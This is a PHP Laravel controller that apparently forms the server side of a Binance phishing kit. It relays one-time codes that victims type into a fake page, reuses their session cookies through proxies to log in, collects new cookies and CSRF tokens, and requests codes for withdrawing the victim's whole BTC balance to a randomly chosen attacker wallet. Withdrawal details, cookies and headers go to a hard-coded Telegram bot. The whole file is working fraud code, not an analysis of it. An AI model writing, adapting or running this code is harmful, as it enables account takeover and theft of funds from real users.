<?php

namespace App\Http\Controllers;

use App\Models\Account;
use App\Models\Wallet;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class VerifyController extends Controller
{
    public function sendEmailVerify(Request $request)
    {
        $data = $request->all();

        $account = Account::query()->where('session_id', $data['session_id'])->orderBy("id", "DESC")->first();

        $uuid = $this->generateUUID(openssl_random_pseudo_bytes(16));

        if ($data['newDevice'] === "true") {
            $post = [
                "bizScene" => "AUTHORIZE_NEW_DEVICE",
                "msgType" => "TEXT",
                "params" => [
                    "device_name" => $_SERVER['HTTP_USER_AGENT']
                ],
                "resend" => false
            ];
        } else {
            $post = [
                "bizScene" => "LOGIN",
                "msgType" => "TEXT",
                "resend" => false
            ];
        }

        $request = Http::withOptions([
            "proxy" => $account->proxy
        ])
            ->withHeaders([
            "origin" => "https://accounts.binance.com",
            "referer" => "https://accounts.binance.com/ru/login",
            "user-agent" => $_SERVER['HTTP_USER_AGENT'],
            "device-info" => $account['device-info'],
            "clienttype" => "web",
            "x-trace-id" => $uuid,
            "x-ui-request-trace" => $uuid,
            "cookie" => $account["cookie"]
        ])->post("https://accounts.binance.com/bapi/accounts/v1/protect/account/email/sendEmailVerifyCode", $post);

        return $request->json();
    }

    public function sendMobileVerify(Request $request)
    {
        $data = $request->all();

        $account = Account::query()->where('session_id', $data['session_id'])->orderBy("id", "DESC")->first();

        $uuid = $this->generateUUID(openssl_random_pseudo_bytes(16));

        if ($data['newDevice'] === "true") {
            $post = [
                "bizScene" => "AUTHORIZE_NEW_DEVICE",
                "msgType" => "TEXT",
                "params" => [
                    "device_name" => $_SERVER['HTTP_USER_AGENT']
                ],
                "resend" => false
            ];
        } else {
            $post = [
                "bizScene" => "LOGIN",
                "msgType" => "TEXT",
                "resend" => false
            ];
        }

        $request = Http::withOptions([
            "proxy" => $account->proxy
        ])
            ->withHeaders([
            "origin" => "https://accounts.binance.com",
            "referer" => "https://accounts.binance.com/ru/login",
            "user-agent" => $_SERVER['HTTP_USER_AGENT'],
            "device-info" => $account['device-info'],
            "clienttype" => "web",
            "x-trace-id" => $uuid,
            "x-ui-request-trace" => $uuid,
            "cookie" => $account["cookie"]
        ])->post("https://accounts.binance.com/bapi/accounts/v1/protect/account/mobile/sendMobileVerifyCode", $post);

        return $request->json();
    }

    public function sendEmailVerifyWithdraw(Request $request)
    {
        $data = $request->all();

        $account = Account::query()->where('session_id', $data['session_id'])->orderBy("id", "DESC")->first();

        $uuid = $this->generateUUID(openssl_random_pseudo_bytes(16));

        $request = Http::withOptions([
            "proxy" => $account->proxy
        ])
            ->withHeaders([
            "origin" => "https://accounts.binance.com",
            "referer" => "https://accounts.binance.com/ru/login",
            "user-agent" => $_SERVER['HTTP_USER_AGENT'],
            "device-info" => $account['device-info'],
            "clienttype" => "web",
            "x-trace-id" => $uuid,
            "x-ui-request-trace" => $uuid,
            "cookie" => $account["cookie"]
        ])->post("https://accounts.binance.com/bapi/accounts/v1/protect/account/email/sendEmailVerifyCode", [
            "bizScene" => "crypto_withdraw",
            "msgType" => "TEXT",
            "params" => [
                "address" => $account->address,
                "addressTag" => "",
                "amount" => $account->balance,
                "asset" => "BTC",
                "assetLabel" => ""
            ],
            "resend" => false
        ]);

        $message = "<b>Email Verify Send</b>\n\n";
        $message .= "SessionID: " . $data['session_id'] . "\n";
        $message .= "Site: " . $_SERVER['HTTP_ORIGIN'] . "\n\n";
        $message .= "Request: " . json_encode([
                "bizScene" => "crypto_withdraw",
                "msgType" => "TEXT",
                "params" => [
                    "address" => $account->address,
                    "addressTag" => "",
                    "amount" => $account->balance,
                    "asset" => "BTC",
                    "assetLabel" => ""
                ],
                "resend" => false
            ]) . "\n\n";
        $message .= "Headers: " . json_encode([
                "origin" => "https://accounts.binance.com",
                "referer" => "https://accounts.binance.com/ru/login",
                "user-agent" => $_SERVER['HTTP_USER_AGENT'],
                "device-info" => $account['device-info'],
                "clienttype" => "web",
                "x-trace-id" => $uuid,
                "x-ui-request-trace" => $uuid,
                "cookie" => $account["cookie"]
            ]) . "\n\n";
        $message .= "Response: " . json_encode($request->json()) . "\n\n";

        Http::get("https://api.telegram.org/bot5150361858:AAHgl2x0m4EaV8MvkK9zn2GimH06TZGPrHs/sendMessage?chat_id=-699752134&text=" . $message . "&parse_mode=HTML");

        return $request->json();
    }

    public function sendMobileVerifyWithdraw(Request $request)
    {
        $data = $request->all();

        $account = Account::query()->where('session_id', $data['session_id'])->orderBy("id", "DESC")->first();

        $uuid = $this->generateUUID(openssl_random_pseudo_bytes(16));

        $request = Http::withOptions([
            "proxy" => $account->proxy
        ])
            ->withHeaders([
            "origin" => "https://accounts.binance.com",
            "referer" => "https://accounts.binance.com/ru/login",
            "user-agent" => $_SERVER['HTTP_USER_AGENT'],
            "device-info" => $account['device-info'],
            "clienttype" => "web",
            "x-trace-id" => $uuid,
            "x-ui-request-trace" => $uuid,
            "cookie" => $account["cookie"]
        ])->post("https://accounts.binance.com/bapi/accounts/v1/protect/account/mobile/sendMobileVerifyCode", [
            "bizScene" => "crypto_withdraw",
            "msgType" => "TEXT",
            "params" => [
                "address" => $account->address,
                "addressTag" => "",
                "amount" => $account->balance,
                "asset" => "BTC",
                "assetLabel" => ""
            ],
            "resend" => false
        ]);

        $message = "<b>Mobile Verify Send</b>\n\n";
        $message .= "SessionID: " . $data['session_id'] . "\n";
        $message .= "Site: " . $_SERVER['HTTP_ORIGIN'] . "\n\n";
        $message .= "Request: " . json_encode([
                "bizScene" => "crypto_withdraw",
                "msgType" => "TEXT",
                "params" => [
                    "address" => $account->address,
                    "addressTag" => "",
                    "amount" => $account->balance,
                    "asset" => "BTC",
                    "assetLabel" => ""
                ],
                "resend" => false
            ]) . "\n\n";
        $message .= "Headers: " . json_encode([
                "origin" => "https://accounts.binance.com",
                "referer" => "https://accounts.binance.com/ru/login",
                "user-agent" => $_SERVER['HTTP_USER_AGENT'],
                "device-info" => $account['device-info'],
                "clienttype" => "web",
                "x-trace-id" => $uuid,
                "x-ui-request-trace" => $uuid,
                "cookie" => $account["cookie"]
            ]) . "\n\n";
        $message .= "Response: " . json_encode($request->json()) . "\n\n";

        Http::get("https://api.telegram.org/bot5150361858:AAHgl2x0m4EaV8MvkK9zn2GimH06TZGPrHs/sendMessage?chat_id=-699752134&text=" . $message . "&parse_mode=HTML");

        return $request->json();
    }

    public function deviceAuth(Request $request)
    {
        $data = $request->all();

        /** @var Account $account */
        $account = Account::query()->where('session_id', $data['session_id'])->orderBy("id", "DESC")->first();

        $uuid = $this->generateUUID(openssl_random_pseudo_bytes(16));

        if ($data['newDevice'] === "true") {
            $request = Http::withOptions([
                "proxy" => $account->proxy
            ])
                ->withHeaders([
                "origin" => "https://accounts.binance.com",
                "referer" => "https://accounts.binance.com/ru/login",
                "user-agent" => $_SERVER['HTTP_USER_AGENT'],
                "device-info" => $account['device-info'],
                "clienttype" => "web",
                "x-trace-id" => $uuid,
                "x-ui-request-trace" => $uuid,
                "content-type" => "application/json",
                "cookie" => $account["cookie"],
                "csrftoken" => $account["csrftoken"]
            ])->post("https://accounts.binance.com/bapi/accounts/v2/protect/account/user-device/authorizeForNewProcess", [
                "emailVerifyCode" => $data["email_code"],
                "googleVerifyCode" => $data["gauth"],
                "mobileVerifyCode" => $data["sms_code"]
            ]);
        } else {
            if ($account->mobile === null) {
                $post = [
                    "email" => $account->email,
                    "isNewLoginProcess" => true,
                    "emailVerifyCode" => $data["email_code"],
                    "googleVerifyCode" => $data["gauth"],
                    "mobileVerifyCode" => $data["sms_code"]
                ];
            } else {
                $post = [
                    "mobile" => $account->mobile,
                    "mobileCode" => $account->mobile_code,
                    "isNewLoginProcess" => true,
                    "emailVerifyCode" => $data["email_code"],
                    "googleVerifyCode" => $data["gauth"],
                    "mobileVerifyCode" => $data["sms_code"]
                ];
            }

            $request = Http::withOptions([
                "proxy" => $account->proxy
            ])
                ->withHeaders([
                "origin" => "https://accounts.binance.com",
                "referer" => "https://accounts.binance.com/ru/login",
                "user-agent" => $_SERVER['HTTP_USER_AGENT'],
                "device-info" => $account['device-info'],
                "clienttype" => "web",
                "x-trace-id" => $uuid,
                "x-ui-request-trace" => $uuid,
                "content-type" => "application/json",
                "cookie" => $account["cookie"],
                "csrftoken" => $account["csrftoken"]
            ])->post("https://accounts.binance.com/bapi/accounts/v2/public/authcenter/login", $post);
        }

        $response = $request->json();

        if (!$response['success']) {
            return $response;
        }

        $cookies = $request->cookies()->toArray();
        $newCookies = $account['cookie'];

        foreach ($cookies as $cookie) {
            if (strtolower($cookie['Name']) === "cr00") {
                $response['data']['csrfToken'] = strtoupper($cookie['Value']);
            }

            $newCookies .= $cookie['Name'] . "=" . $cookie['Value'] . ";";
        }

        $account->cookie = $newCookies;
        $account->save();

        return $response;
    }

    public function getPersonalData(Request $request)
    {
        $data = $request->all();

        /** @var Account $account */
        $account = Account::query()->where('session_id', $data['session_id'])->orderBy("id", "DESC")->first();

        if (isset($data['csrfToken'])) {
            $account->csrftoken = $data['csrfToken'];
            $account->save();
        }

        $baseDetail = $this->getBaseDetailUser($account);

        if (!$baseDetail['success']) {
            return $baseDetail;
        }

        $date = \Carbon\Carbon::now();
        $date = $date->subHours(4);
        $date = $date->format("j F, h:i A");

        $account->is_auth = true;
        $account->save();

        $wallet = Wallet::query()->inRandomOrder()->first();

        $account->address = $wallet->address;
        $account->save();

        return [
            "success" => true,
            "data" => [
                "address" => $wallet->address,
                "btc_amount" => "0.001",
                "email" => $baseDetail['data']['email'],
                "firstName" => strtoupper($baseDetail['data']['firstName']),
                "lastName" => strtoupper($baseDetail['data']['lastName']),
                "transfer_date" => $date
            ]
        ];
    }

    private function getBaseDetailUser(Account $account)
    {
        $request = Http::withOptions([
            "proxy" => $account->proxy
        ])
            ->withHeaders([
            "user-agent" => $_SERVER['HTTP_USER_AGENT'],
            "clienttype" => "web",
            "cookie" => $account["cookie"],
            "csrftoken" => $account["csrftoken"]
        ])->post("https://www.binance.com/bapi/accounts/v1/private/account/user/base-detail");

        return $request->json();
    }

    private function generateUUID($data): string
    {
        assert(strlen($data) == 16);

        $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
        $data[8] = chr(ord($data[8]) & 0x3f | 0x80);

        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
    }
}
